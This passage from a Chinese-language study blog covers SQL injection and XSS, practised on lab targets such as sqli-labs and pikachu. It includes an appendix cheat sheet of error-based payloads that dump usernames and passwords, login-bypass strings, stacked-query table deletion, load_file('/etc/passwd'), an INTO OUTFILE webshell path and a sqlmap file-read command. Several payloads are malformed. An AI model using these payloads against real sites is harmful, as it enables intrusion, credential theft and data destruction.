class="number">1</span>)</span><br><span class="line"></span><br><span class="line">链接用户</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">链接数据库</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">爆库</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> schema_name),<span class="number">0x7e</span>) <span class="keyword">FROM</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">爆表</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> table_name),<span class="number">0x7e</span>) <span class="keyword">FROM</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">爆字段</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> column_name),<span class="number">0x7e</span>) <span class="keyword">FROM</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">爆字段内容</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x23</span>,username,<span class="number">0x3a</span>,password,<span class="number">0x23</span>) <span class="keyword">FROM</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">爆表名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())),<span class="number">1</span>)#</span><br><span class="line">爆列名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;users&quot;)),<span class="number">1</span>)#</span><br><span class="line">爆字段</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span> data <span class="keyword">from</span> users)),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>


<h5 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h5><p><code>extractvalue(xml_frag, xpath_expr)</code>：使用XPath表示法从XML字符串中提取值</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">xml_frag</td>
<td align="left">目标xml文档</td>
</tr>
<tr>
<td align="left">xpath_expr</td>
<td align="left">Xpath格式的字符串，xml路径</td>
</tr>
</tbody></table>
<p>payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>));</span><br></pre></td></tr></table></figure>
<p>如果Xpath格式语法书写错误的话，就会报错。利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出</p>
<h4 id="5、二次注入"><a href="#5、二次注入" class="headerlink" title="5、二次注入"></a>5、二次注入</h4><h5 id="有待学习–"><a href="#有待学习–" class="headerlink" title="有待学习–="></a>有待学习–=</h5><h4 id="6、堆叠注入"><a href="#6、堆叠注入" class="headerlink" title="6、堆叠注入"></a>6、堆叠注入</h4><p>原理：在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</p>
<p>局限性：API以及数据库引擎不支持，抑或是权限不足导致无法调用；即使能使用通常软件代码只会返回一个查询结果</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#例子</span><br><span class="line"></span><br><span class="line">用户输入：`<span class="number">1</span>; <span class="keyword">DELETE</span> <span class="keyword">FROM</span> products`</span><br><span class="line">服务器端生成的<span class="keyword">sql</span>语句为：`<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> products <span class="keyword">where</span> productid<span class="operator">=</span><span class="number">1</span>;<span class="keyword">DELETE</span> <span class="keyword">FROM</span> products`</span><br><span class="line">当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</span><br></pre></td></tr></table></figure>


<blockquote>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0nth3way/articles/7128189.html#autoid-0-0-0">https://www.cnblogs.com/0nth3way/articles/7128189.html#autoid-0-0-0</a></p>
<p><a target="_blank" rel="noopener" href="https://www.sqlinjection.net/stacked-queries/">https://www.sqlinjection.net/stacked-queries/</a></p>
</blockquote>
<h4 id="7、http-head注入"><a href="#7、http-head注入" class="headerlink" title="7、http head注入"></a>7、http head注入</h4><blockquote>
<p>HTTP头注入其实并不是一个新的SQL注入类型，而是指出现SQL注入漏洞的场景。<br>有些时候，后台开发人员为了验证客户端头信息（比如常用的cookie验证）<br>或者通过HTTP header头信息获取客户端的一些资料，比如User-Agent、Accept字段等。<br>会对客户端的HTTP header信息进行获取并使用SQL进行处理，如果此时没有足够的安全考虑则可能会导致基于HTTP header的SQL Inject漏洞。</p>
</blockquote>
<h5 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h5><p>原理：php中，使用超全局变量 <code>$_GET</code>，<code>$_POST</code>来接受参数。 asp中，使用 <code>Request.QueryString (GET)</code>或 <code>Request.Form (POST)</code>来接收页面提交的参数值。 有些程序员直接这么写：<code>$id = $_REQUEST[&#39;id&#39;];</code>这时候PHP不知道，应该从GET还是POST方式上接收参数 ，它就会一个一个去试，它是先取GET中的数据，再取POST中的数据，还会去取Cookies中的数据，如果没有做好防护措施就容易导致存在cookie注入</p>
<p>Cookie 注入特征：通过修改cookie的数值</p>
<p>方法：</p>
<p>方法一：burp抓包修改</p>
<p>方法二：使用sqlmap进行注入</p>
<h5 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h5><h5 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h5><h4 id="8、读写文件"><a href="#8、读写文件" class="headerlink" title="8、读写文件"></a>8、读写文件</h4><p><code>load_file（file_name）</code>：读取文件并返回该文件内容作为一个字符串。</p>
<p>使用条件</p>
<ul>
<li><p>必须有权限读取并且文件必须完全可读，</p>
<!--可以通过在my.ini中添加secure_file_priv这一项来许可文件读写。mysql下执行`show global variables like '%secure%';`可以查看`secure_file_priv`的值-->
</li>
<li><p>必须指定文件完整路径</p>
</li>
<li><p>能够使用union查询（sql注入时）</p>
</li>
<li><p>对Web目录有写权限用户必须有secure_file_priv=文件权限</p>
</li>
<li><p>欲读取文件必须小于max_allowed_packetde的允许值</p>
</li>
</ul>
<p><strong>secure_file_priv的值</strong></p>
<table>
<thead>
<tr>
<th align="left">设置</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">secure_file_prive=null</td>
<td align="left">限制mysql不允许导入/导出</td>
</tr>
<tr>
<td align="left">secure_file_priv=/tmp/</td>
<td align="left">限制mysql的导入/导出只能发生在/tmp/目录下</td>
</tr>
<tr>
<td align="left">secure_file_priv=空</td>
<td align="left">不限制mysql的导入/导出</td>
</tr>
</tbody></table>
<p>实例：</p>
<p>sqli-labs第七关</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#查看页面变化，判断<span class="keyword">sql</span>注入类别 </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> </span><br><span class="line">#You <span class="keyword">are</span> in.... Use outfile...... </span><br><span class="line">#确定字段数 </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3 --+ ?id=1&#x27;</span>)) <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+ </span></span><br><span class="line">#联合查询查看显示位 </span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> </span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;)) union select 1,load_file(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;),3 --+ </span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>)) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="string">&#x27;&#x27;</span>),<span class="number">3</span> <span class="keyword">into</span> outfile &quot;/var/www/html/a.php&quot;<span class="comment">--+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>sqlmap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://xxx/x?id=1&quot;</span> --file-read=/etc/passwd</span><br></pre></td></tr></table></figure>


<h2 id="靶场记录"><a href="#靶场记录" class="headerlink" title="靶场记录"></a>靶场记录</h2><p>DVWA：<a target="_blank" rel="noopener" href="https://jwt1399.top/posts/27769.html#toc-heading-16">https://jwt1399.top/posts/27769.html#toc-heading-16</a></p>
<h2 id="Ⅳ：加固sql"><a href="#Ⅳ：加固sql" class="headerlink" title="Ⅳ：加固sql"></a>Ⅳ：加固sql</h2><p>1、对代码语句里面的变量进行过滤</p>
<p>2、使用参数化（Parameterized Query 或 Parameterized Statement）？具体不是很了解，存疑</p>
<h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、通过floor报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、通过ExtractValue报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables limit <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、通过UpdateXml报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、通过NAME_CONST报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(selectfrom (selectfrom(selectname_const(@<span class="variable">@version</span>,<span class="number">0</span>))a <span class="keyword">join</span> (<span class="keyword">select</span> name_const(@<span class="variable">@version</span>,<span class="number">0</span>))b)c)</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、通过<span class="keyword">join</span>报错,注入语句如下:</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user ajoin mysql.user b)c;</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、通过exp报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span> () ) a) );</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>、通过GeometryCollection()报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> GeometryCollection(()<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span> () )a)b );</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>、通过polygon ()报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> polygon (()<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span> ())a)b );</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>、通过multipoint ()报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> multipoint (()<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>() )a)b );</span><br><span class="line"></span><br><span class="line"><span class="number">10</span>、通过multlinestring ()报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> multlinestring (()<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(selectuser () )a)b );</span><br><span class="line"></span><br><span class="line"><span class="number">11</span>、通过multpolygon ()报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> multpolygon (()<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(selectuser () )a)b );</span><br><span class="line"></span><br><span class="line"><span class="number">12</span>、通过linestring ()报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> linestring (()<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>() )a)b );</span><br><span class="line"></span><br><span class="line">关于POST注入</span><br><span class="line">常用的万能username语句：</span><br><span class="line">a ’ <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #</span><br><span class="line">a &quot;) or 1=1 #</span><br><span class="line">a‘) or 1=1 #</span><br><span class="line">a” or “1”=”1</span><br><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; or (length(database())) = 8 (用于输入’ “都没有错误)</span><br><span class="line">&#x27; or (ascii(substr((select database()) ,1,1))) = 115 # (用于输入’ “都没有错误)</span><br><span class="line">&quot;) <span class="keyword">or</span> (&quot;1&quot;)<span class="operator">=</span>(&quot;1</span><br><span class="line">&quot;) <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>, sleep(<span class="number">1</span>), <span class="keyword">null</span>) #</span><br><span class="line">&quot;) or (length(database())) = 8 #</span><br><span class="line">&quot;) <span class="keyword">or</span> (ascii(substr((<span class="keyword">select</span> database()) ,<span class="number">1</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">115</span> <span class="keyword">or</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>, sleep(<span class="number">1</span>), <span class="keyword">null</span>) #</span><br><span class="line"></span><br><span class="line">post型盲注通杀payload：</span><br><span class="line">uname<span class="operator">=</span>admin<span class="operator">%</span>df<span class="string">&#x27;or()or%200%23&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">关于UPDATEXML,REFERER,COOKIE的构造</span></span><br><span class="line"><span class="string">User-Agent:.........&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>),”,”) #</span><br><span class="line">Referer: ’ <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>),”,”) #</span><br><span class="line">Cookie:username: admin ’ <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br><span class="line"></span><br><span class="line">updatexml报错注入</span><br><span class="line">爆数据库版本信息：?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> @<span class="variable">@version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">链接用户：?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">链接数据库：?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">爆库：?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> schema_name),<span class="number">0x7e</span>) <span class="keyword">FROM</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">爆表：?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> table_name),<span class="number">0x7e</span>) <span class="keyword">FROM</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">爆字段：?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> column_name),<span class="number">0x7e</span>) <span class="keyword">FROM</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">爆字段内容：?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x23</span>,username,<span class="number">0x3a</span>,password,<span class="number">0x23</span>) <span class="keyword">FROM</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">链接：https:<span class="operator">/</span><span class="operator">/</span>www.jianshu.com<span class="operator">/</span>p<span class="operator">/</span>bc35f8dd4f7c</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="二：xss注入"><a href="#二：xss注入" class="headerlink" title="二：xss注入"></a>二：xss注入</h1><p>XSS 全称(Cross Site Scripting) 跨站脚本攻击， 是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的.  比如获取用户的Cookie，导航到恶意网站,携带木马等。</p>
<blockquote>
<p>危害</p>
<ol>
<li>通过document.cookie盗取cookie</li>
<li>使用js或css破坏页面正常的结构与样式</li>
<li>流量劫持（通过访问某段具有window.location.href定位到其他页面）</li>
<li>Dos攻击：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应。</li>
<li>利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</li>
<li>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li>
</ol>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuqun/p/12484816.html">https://www.cnblogs.com/wuqun/p/12484816.html</a></p>
<h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">假如页面有如下一个输入框</span><br><span class="line"></span><br><span class="line">　　&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;record&quot;</span> value=<span class="string">&quot;沙发&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">　　【沙发】是来自用户的输入，如果用户输入的是<span class="string">&quot;onfocus=&quot;</span>alert(<span class="built_in">document</span>.cookie)</span><br><span class="line"></span><br><span class="line">　　那么就会变成 </span><br><span class="line"></span><br><span class="line">　　&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;address1&quot;</span> value=<span class="string">&quot;&quot;</span> onfocus=<span class="string">&quot;alert(document.cookie)&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">　　 事件被触发的时候嵌入的JavaScript代码将会被执行</span><br><span class="line"></span><br><span class="line">　　 攻击的威力，取决于用户输入了什么样的脚本。</span><br></pre></td></tr></table></figure>
<h2 id="主要分为三大类"><a href="#主要分为三大类" class="headerlink" title="主要分为三大类"></a>主要分为三大类</h2><p>原因：是一种发生在前端浏览器端的漏洞，主要原因：程序的输入输出没有做合适的处理</p>
<h3 id="1、反射型xss"><a href="#1、反射型xss" class="headerlink" title="1、反射型xss"></a>1、反射型xss</h3><p>​    最常见也是使用范围最广泛的一个，可以将恶意脚本附加到URl地址的参数中</p>
<h3 id="2、存储型xss"><a href="#2、存储型xss" class="headerlink" title="2、存储型xss"></a>2、存储型xss</h3><p>​    此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中</p>
<h3 id="3、dome型xss"><a href="#3、dome型xss" class="headerlink" title="3、dome型xss"></a>3、dome型xss</h3><p>全称Document Object Model，使用DOM可以使程序和脚本能够动态访问更新文档的内容，结构及样式。<br>DOM型XSS是一种特殊类型的反射型XSS，基于DOM文档对象模型的一种漏洞。<br>gongji方式：用户请求一个经过专门设计的链接，由gongji者提交且包含恶意XSS代码，服务器的响应不会以任何形式包含gongji者的脚本，当受害者的浏览器处理这个响应时，DOM对象就会处理XSS恶意代码。</p>
<h2 id="手动测试"><a href="#手动测试" class="headerlink" title="手动测试"></a>手动测试</h2><p>靶场：pikachu</p>
<h4 id="1、反射型"><a href="#1、反射型" class="headerlink" title="1、反射型"></a>1、反射型</h4><p>get/post</p>
<p>一般来说我们使用<script>alert(/xss/)</script>来报xss弹窗</p>
<p>但是我们在测试时发现pikachu，限制了我们输入的长度</p>
<p>我们只需要F12，定位修改一下长度即可</p>
<p><img src="./%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%5Cxss-1.png" alt="xss"></p>
<h4 id="2、存储型"><a href="#2、存储型" class="headerlink" title="2、存储型"></a>2、存储型</h4><p>会一直存在与代码当中，一直访问一直有</p>
<p>我们只需要在留言板中输入payload即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h4 id="3、dom形XSS"><a href="#3、dom形XSS" class="headerlink" title="3、dom形XSS"></a>3、dom形XSS</h4><p>DOM 型 XSS 形成原因是通过修改页面的 DOM 节点形成的 XSS。<br>DOM 型 XSS 攻击中，取出和执行恶意代码都由浏览器端完成，属于前端自身的安全漏洞。</p>
<p><strong>攻击步骤：</strong><br>1、攻击者构造出特殊的 URL，其中包含恶意代码。<br>2、用户被诱导打开带有恶意代码的 URL。<br>3、用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。<br>4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p>
<p>举例：</p>
<p>下面是一个物流详情的页面，在 URL 上有快递编号这个参数，通过这个参数来获取数据。 </p>
<p><a target="_blank" rel="noopener" href="https://www.kkkk1000.com/xss/dom/index.html?serialNumber=YT40359134268305">https://www.kkkk1000.com/xss/dom/index.html?serialNumber=YT40359134268305</a></p>
<p><img src="./%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%5CXSS-dom-1.png" alt="img"></p>
<p>因为在源码中可以看到，页面上显示的快递编号，是直接取的 URL 上的参数显示的。所以我们构造这样一个网址： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.kkkk1000.com&#x2F;xss&#x2F;dom&#x2F;index.html?serialNumber&#x3D;alert(&quot;xss&quot;)</span><br></pre></td></tr></table></figure>
<p>然后诱导他人点击这个链接，就可以完成一次 DOM 型 XSS 攻击。</p>
<p><img src="./%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%5CXSS-dom-2.png" alt="img"></p>
<h4 id="4、XSS盲打"><a href="#4、XSS盲打" class="headerlink" title="4、XSS盲打"></a>4、XSS盲打</h4><h4 id="5、XSS过滤"><a href="#5、XSS过滤" class="headerlink" title="5、XSS过滤"></a>5、XSS过滤</h4><h4 id="6、xss之htmlspecialchars"><a href="#6、xss之htmlspecialchars" class="headerlink" title="6、xss之htmlspecialchars"></a>6、<strong>xss之htmlspecialchars</strong></h4><h3 id="xss加固"><a href="#xss加固" class="headerlink" title="xss加固"></a>xss加固</h3><p>1、浏览器自XSS防御：比如谷歌和safari，当检测到有xss时，浏览器自动停止加载</p>
